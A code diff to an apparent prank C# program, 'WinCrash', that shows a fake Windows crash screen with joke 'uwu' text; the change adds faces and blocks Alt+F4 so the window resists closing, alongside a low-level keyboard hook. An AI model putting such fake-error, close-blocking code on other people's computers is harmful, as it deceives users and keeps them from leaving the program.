@@ -8,7 +8,7 @@ namespace WinCrash
 {
     public partial class Form1 : Form
     {
-        private string[] faces = { ":(", ":3", "x3", ";3", "uwu", "owo", ":)", ":o", ":p", ">w<" };
+        private string[] faces = { ":(", ":3", "x3", ";3", "uwu", "owo", ":)", ":o", ":p", ">w<", "^w^", "SOWWY" };
         private int currentFaceIndex = 0;
         private string originalMainText = "Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.";
         private string alternateMainText = "Oopsie Woopsie! Uwu We made a fucky wucky!! A wittle fucko boingo! The code monkeys at our headquarters are working VEWY HAWD to fix this!";
@@ -183,8 +183,18 @@ namespace WinCrash
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
 
-        // P/Invoke declarations
-        private const int WH_KEYBOARD_LL = 13;
+        //Disable F4
+        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
+        {
+	        if (keyData == (Keys.Alt | Keys.F4))
+	        {
+		        return true;
+	        }
+	        return base.ProcessCmdKey(ref msg, keyData);
+        }
+
+		// P/Invoke declarations
+		private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
